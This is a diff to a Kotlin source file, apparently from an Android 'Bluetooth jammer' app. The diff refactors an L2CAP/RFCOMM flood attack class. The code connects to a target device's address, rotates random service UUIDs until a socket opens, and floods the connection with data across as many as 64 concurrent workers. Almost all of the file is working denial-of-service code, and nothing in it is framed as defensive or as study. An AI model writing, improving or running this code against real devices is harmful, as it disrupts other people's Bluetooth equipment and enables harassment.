@@ -6,125 +6,107 @@ import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothManager
 import android.bluetooth.BluetoothSocket
 import android.content.Context
-import android.os.Build
-import android.widget.TextView
-import androidx.annotation.RequiresApi
 import androidx.core.content.ContextCompat.getSystemService
-import com.eikarna.bluetoothjammer.AttackActivity
-import com.google.android.material.textview.MaterialTextView
-import kotlinx.coroutines.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
 import java.io.IOException
-import java.util.*
-import util.Logger
+import java.util.Collections
+import java.util.UUID
 
-class L2capFloodAttack(private val targetAddress: String) {
+/**
+ * L2CAP Flood (classic): opens RFCOMM sockets towards the target using random
+ * service UUIDs and floods each connected socket with data.
+ * This is the technique the app originally shipped with.
+ */
+class L2capFloodAttack(private val targetAddress: String, private val threads: Int = 8) : BluetoothAttack {
+
+    override val displayName = AttackType.L2CAP_FLOOD.displayName
+    override val description = AttackType.L2CAP_FLOOD.description
+
     private var bluetoothAdapter: BluetoothAdapter? = null
-    private var l2capSocket: BluetoothSocket? = null
-    private var coroutineScope: CoroutineScope? = null
+    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
+    private var scope: CoroutineScope? = null
+    @Volatile
+    private var running = false
 
-    // Purge oldest messages if the line count exceeds 100
-    private fun purgeOldestMessagesIfNeeded(element: TextView) {
-        val maxLines = 100
-        val lines = element.text.split("\n")
-        if (lines.size > maxLines) {
-            val newText = lines.takeLast(maxLines).joinToString("\n")
-            element.text = newText
-        }
-    }
+    override fun isRunning() = running
 
-    @RequiresApi(Build.VERSION_CODES.Q)
     @SuppressLint("MissingPermission")
-    fun startAttack(context: Context, element: MaterialTextView) {
-        coroutineScope = CoroutineScope(Dispatchers.IO)
-        val bluetoothManager: BluetoothManager? = getSystemService(context, BluetoothManager::class.java)
-        bluetoothAdapter = bluetoothManager?.adapter
+    override fun start(context: Context, onLog: (String) -> Unit) {
+        if (running) return
+        running = true
+        bluetoothAdapter = getSystemService(context, BluetoothManager::class.java)?.adapter
         val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)
+        if (device == null) {
+            running = false
+            return
+        }
 
-        if (device != null) {
-            coroutineScope!!.launch {
-                var successfulUUID: UUID? = null
+        val workerCount = threads.coerceIn(1, 64)
+        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+        onLog("L2CAP Flood iniciado (objetivo $targetAddress, $workerCount worker(s))")
+
+        repeat(workerCount) { worker ->
+            scope!!.launch {
                 val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
-
-                while (true) {
+                var successfulUUID: UUID? = null
+                while (isActive && running) {
                     val uuid = successfulUUID ?: baseUUID
+                    var socket: BluetoothSocket? = null
                     try {
-                        // Create socket and connect
-                        l2capSocket = device.createInsecureRfcommSocketToServiceRecord(uuid)
-                        l2capSocket?.connect()
-                        if (l2capSocket?.isConnected == true) {
-                            successfulUUID = uuid // Remember successful UUID
-                            break // Connection successful
+                        socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
+                        socket.connect()
+                        if (socket.isConnected) {
+                            successfulUUID = uuid
+                            sockets.add(socket)
+                            onLog("[$worker] Conexión establecida (UUID $uuid)")
+                            floodSocket(socket, onLog, worker)
+                            break
                         }
                     } catch (err: IOException) {
-                        // Generate new UUID on failure
-                        successfulUUID = UUID.fromString(UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB")
-                        if (AttackActivity.loggingStatus) {
-                            (context as AttackActivity).runOnUiThread {
-                                if (AttackActivity.isAttacking) {
-                                    purgeOldestMessagesIfNeeded(element)
-                                    Logger.appendLog(element, "Failed to connect..")
-                                } else {
-                                    cancel()
-                                }
-                            }
-                        }
-                    }
-                }
-
-                // Proceed with the flood attack if connected
-                if (l2capSocket?.isConnected == true) {
-                    if (AttackActivity.loggingStatus) {
-                        (context as AttackActivity).runOnUiThread {
-                            if (AttackActivity.isAttacking) {
-                                Logger.appendLog(element, "Connection established.")
-                                Logger.appendLog(element, "Sending payload..")
-                            }
-                            else cancel()
-                        }
-                        floodAttack()
-                    }
-                } else {
-                    if (AttackActivity.loggingStatus) {
-                        (context as AttackActivity).runOnUiThread {
-                            if (AttackActivity.isAttacking) {
-                                purgeOldestMessagesIfNeeded(element)
-                                Logger.appendLog(element, "Connection could not be established.")
-                            } else cancel()
-                        }
+                        runCatching { socket?.close() }
+                        successfulUUID = UUID.fromString(
+                            UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
+                        )
+                        if (isActive && running) onLog("[$worker] Intento fallido, UUID rotado")
+                        delay(100)
                     }
                 }
             }
         }
     }
 
-    private fun floodAttack() {
-        val dataSize = l2capSocket?.maxTransmitPacketSize ?: 600
-        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }
-
+    private suspend fun floodSocket(socket: BluetoothSocket, onLog: (String) -> Unit, worker: Int) {
+        val raw = socket.maxTransmitPacketSize
+        val dataSize = if (raw > 0) raw else 600
+        val sendBuffer = ByteArray(dataSize) { (('A'.code) + (it % 40)).toByte() }
         try {
-            while (AttackActivity.isAttacking && l2capSocket?.isConnected == true) {
-                l2capSocket?.outputStream?.write(sendBuffer)
+            var blocks = 0
+            while (running && socket.isConnected) {
+                socket.outputStream.write(sendBuffer)
+                blocks++
+                if (blocks % 200 == 0) onLog("[$worker] Enviados $blocks bloques")
             }
         } catch (e: IOException) {
-            e.printStackTrace()
+            // connection dropped by the remote side — expected under flood
+        } finally {
+            runCatching { socket.close() }
+            sockets.remove(socket)
         }
     }
 
-    @SuppressLint("MissingPermission")
-    fun stopAttack() {
-        AttackActivity.isAttacking = false
-        coroutineScope?.cancel() // Cancel the coroutine, stopping the attack
-        coroutineScope = null
-        closeConnection()
-        l2capSocket = null
-        bluetoothAdapter?.startDiscovery()
-    }
-
-    private fun closeConnection() {
-        try {
-            l2capSocket?.close()
-        } catch (e: IOException) {
-            e.printStackTrace()
+    override fun stop() {
+        running = false
+        scope?.cancel()
+        scope = null
+        synchronized(sockets) {
+            sockets.forEach { s -> runCatching { s.close() } }
+            sockets.clear()
         }
     }
 }
